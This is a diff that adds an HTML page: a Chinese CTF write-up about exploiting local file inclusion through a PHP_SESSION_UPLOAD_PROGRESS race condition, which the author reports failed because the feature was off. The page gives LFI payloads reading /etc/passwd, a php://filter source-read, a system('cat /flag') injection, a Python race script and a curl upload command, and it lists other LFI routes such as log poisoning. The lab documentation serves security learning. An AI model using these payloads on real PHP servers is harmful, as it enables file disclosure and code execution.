@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LFI与Session Upload Progress — DARKSEC</title>
+<meta name="description" content="LFI漏洞利用与PHP_SESSION_UPLOAD_PROGRESS条件竞争分析">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 文件包含 / 条件竞争</div>
+        <h1>LFI与Session Upload Progress：条件竞争的那些坑</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-17</span>
+          <span>⏱ 8 min read</span>
+          <span>🏷 LFI / Session / 条件竞争</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">概述</a></li>
+            <li><a href="#lfi-basics">LFI基础</a></li>
+            <li><a href="#session-upload">Session Upload Progress</a></li>
+            <li><a href="#race-condition">条件竞争原理</a></li>
+            <li><a href="#exploit-failed">实战踩坑</a></li>
+            <li><a href="#lessons">经验教训</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">概述</h2>
+        <p>本文记录了一次CTF靶场的实战经历，涉及LFI（本地文件包含）漏洞和PHP_SESSION_UPLOAD_PROGRESS条件竞争攻击。虽然最终因为配置问题没有成功，但过程中学到了很多。</p>
+
+        <blockquote>
+          <p>失败的经验也是经验——知道什么路走不通，比盲目尝试更重要</p>
+        </blockquote>
+
+        <h2 id="lfi-basics">LFI基础</h2>
+        <p>本地文件包含（LFI）是指应用程序包含服务器上的文件时，没有正确过滤用户输入。</p>
+
+        <h3>常见利用方式</h3>
+        <pre><code># 读取系统文件
+include.php?file=/etc/passwd
+include.php?file=/proc/self/cmdline
+
+# 目录遍历
+include.php?file=../../../../etc/passwd
+
+# PHP伪协议（如果没被过滤）
+include.php?file=php://filter/convert.base64-encode/resource=config.php</code></pre>
+
+        <h3>靶场发现</h3>
+        <pre><code># 访问目标，发现重定向
+curl http://target:14302
+# => 302 重定向到 /include.php
+
+# 测试LFI
+curl "http://target/include.php?file=/etc/passwd"
+# => 成功读取，确认存在LFI
+
+# 测试PHP文件包含
+curl "http://target/include.php?file=index.php"
+# => "文件不存在或不可读" — PHP文件被过滤了
+
+# 测试php://filter
+curl "http://target/include.php?file=php://filter/convert.base64-encode/resource=index.php"
+# => 被WAF拦截</code></pre>
+
+        <h2 id="session-upload">Session Upload Progress</h2>
+        <p>PHP有一个特性：当上传文件时，如果设置了<code>PHP_SESSION_UPLOAD_PROGRESS</code>字段，PHP会将上传进度写入session文件。</p>
+
+        <h3>正常流程</h3>
+        <pre><code>1. 客户端发送上传请求，包含 PHP_SESSION_UPLOAD_PROGRESS 字段
+2. PHP创建session文件：/tmp/sess_&lt;PHPSESSID&gt;
+3. PHP将上传进度写入session文件
+4. 上传完成，PHP清理session中的进度数据
+5. 客户端可以读取session获取上传进度</code></pre>
+
+        <h3>攻击思路</h3>
+        <pre><code>1. 在 PHP_SESSION_UPLOAD_PROGRESS 字段写入PHP代码
+2. 上传一个大文件（延长进度数据存在的时间）
+3. 同时用LFI包含session文件
+4. 如果时机正确，就能执行注入的PHP代码
+
+Payload:
+PHP_SESSION_UPLOAD_PROGRESS = <?php system('cat /flag'); ?>
+文件: 任意文件（越大越好）</code></pre>
+
+        <h2 id="race-condition">条件竞争原理</h2>
+        <p>这个攻击的核心是<strong>条件竞争</strong>——需要在进度数据被清理之前读取session文件。</p>
+
+        <pre><code>时间线：
+|--上传开始--|--进度写入session--|--上传完成--|--清理session数据--|
+                            ↑
+                    必须在这个窗口内读取!</code></pre>
+
+        <h3>为什么难？</h3>
+        <ul>
+          <li>窗口时间极短（毫秒级）</li>
+          <li>需要高并发请求才能命中</li>
+          <li>服务器可能有配置限制</li>
+          <li><code>session.upload_progress.cleanup = On</code>时，上传完成立即清理</li>
+        </ul>
+
+        <h2 id="exploit-failed">实战踩坑</h2>
+        <p>在这个靶场中，我尝试了多种方法都失败了：</p>
+
+        <h3>尝试1：多线程并发</h3>
+        <pre><code>import threading
+
+# 线程1：持续上传
+def upload():
+    requests.post(url, files=big_file, cookies=cookies)
+
+# 线程2：持续读取session
+def read_session():
+    while True:
+        r = requests.get(f"{base}/include.php?file=/tmp/sess_{sid}")
+        if "flag" in r.text:
+            print("Found!")
+
+# 同时启动
+threading.Thread(target=upload).start()
+threading.Thread(target=read_session).start()
+
+# 结果：session文件始终为空</code></pre>
+
+        <h3>尝试2：降低上传速率</h3>
+        <pre><code># 使用curl的--limit-rate降低上传速度
+# 理论上延长进度数据存在的时间
+curl --limit-rate 1K -X POST /upload.php \
+  -F "PHP_SESSION_UPLOAD_PROGRESS=<?=system('cat /flag')?>" \
+  -F "file=@/tmp/bigfile.bin"
+
+# 结果：session文件依然为空</code></pre>
+
+        <h3>尝试3：验证配置</h3>
+        <pre><code># 最终验证：上传过程中session是否写入数据
+# 结论：session.upload_progress.enabled = OFF
+# 这个功能根本没开！</code></pre>
+
+        <h3>失败原因</h3>
+        <table>
+          <thead>
+            <tr>
+              <th>测试项</th>
+              <th>结果</th>
+              <th>说明</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>LFI漏洞</td>
+              <td>✅ 存在</td>
+              <td>能读取系统文件</td>
+            </tr>
+            <tr>
+              <td>Session文件路径</td>
+              <td>✅ 可读</td>
+              <td>/tmp/sess_XXX 可访问</td>
+            </tr>
+            <tr>
+              <td>Session内容</td>
+              <td>❌ 始终为空</td>
+              <td>上传进度未写入</td>
+            </tr>
+            <tr>
+              <td>upload_progress.enabled</td>
+              <td>❌ 关闭</td>
+              <td>功能被禁用</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2 id="lessons">经验教训</h2>
+
+        <h3>1. 先验证，再攻击</h3>
+        <p>我犯的最大错误：<strong>没有先验证session.upload_progress是否开启</strong>，就盲目跑了十几轮并发脚本。</p>
+        <pre><code># 应该第一步就做这个测试
+# 上传时检查session文件是否写入数据
+# 如果始终为空，说明功能没开，立即换思路</code></pre>
+
+        <h3>2. 理解配置的重要性</h3>
+        <p>相关PHP配置：</p>
+        <pre><code>session.upload_progress.enabled = On   # 必须开启
+session.upload_progress.cleanup = On   # 上传后清理（默认开启）
+session.upload_progress.prefix = "upload_progress_"
+session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"</code></pre>
+
+        <h3>3. 其他LFI利用思路</h3>
+        <p>当session upload progress不通时，还有这些方法：</p>
+        <ul>
+          <li><strong>日志投毒</strong>：注入代码到access.log/error.log，然后包含日志文件</li>
+          <li><strong>/proc/self/environ</strong>：包含进程环境变量</li>
+          <li><strong>/proc/self/fd/</strong>：包含文件描述符</li>
+          <li><strong>pearcmd.php</strong>：利用PEAR命令写文件</li>
+          <li><strong>php://filter</strong>：如果没被过滤，可以读取PHP源码</li>
+        </ul>
+
+        <h3>4. 时间管理</h3>
+        <p>在一条路上卡太久时，应该：</p>
+        <ol>
+          <li>设定时间限制（比如30分钟）</li>
+          <li>如果没进展，立即换思路</li>
+          <li>记录已尝试的方法，避免重复</li>
+        </ol>
+
+        <div style="text-align:center;padding:40px 0 20px;font-size:0.9rem;color:#c0c0d0;font-style:italic;">
+          ~ 失败也是学习 nya~ <img src="/assets/images/cat-final.png" alt="cat" style="width:1em;height:1em;vertical-align:middle;">
+        </div>
+
+        <div class="article-tags">
+          <span class="tag pink">LFI</span>
+          <span class="tag">条件竞争</span>
+          <span class="tag purple">PHP Session</span>
+          <span class="tag yellow">CTF</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div style="text-align:center;margin-bottom:16px;">
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+    </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
